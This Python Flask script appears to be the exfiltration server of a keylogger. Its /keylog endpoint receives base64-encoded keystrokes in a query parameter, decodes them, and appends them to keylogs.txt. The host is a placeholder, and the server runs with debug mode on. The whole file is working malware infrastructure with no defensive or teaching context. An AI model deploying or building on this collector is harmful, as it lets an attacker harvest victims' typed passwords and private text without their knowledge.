from flask import Flask, request
import base64

app = Flask(__name__)

def write_file(key):
    with open('./keylogs.txt', 'a') as f:
        f.write(key)

def decode_b64(message):
    base64_bytes = message.encode("utf-8")
    message_bytes = base64.urlsafe_b64decode(base64_bytes)
    return message_bytes.decode("utf-8")

@app.route('/')
def index_page():
    return 'Hello, World!'

@app.route('/keylog')
def keylog():
    data = request.args.get('data')
    try:
        data = decode_b64(data)
        print(data)
        write_file(data)
    except Exception as err:
        return '🤨'

    return '😉'

if __name__ == '__main__':
    app.run(debug=True, host='IP-ADDRESS', port=80)
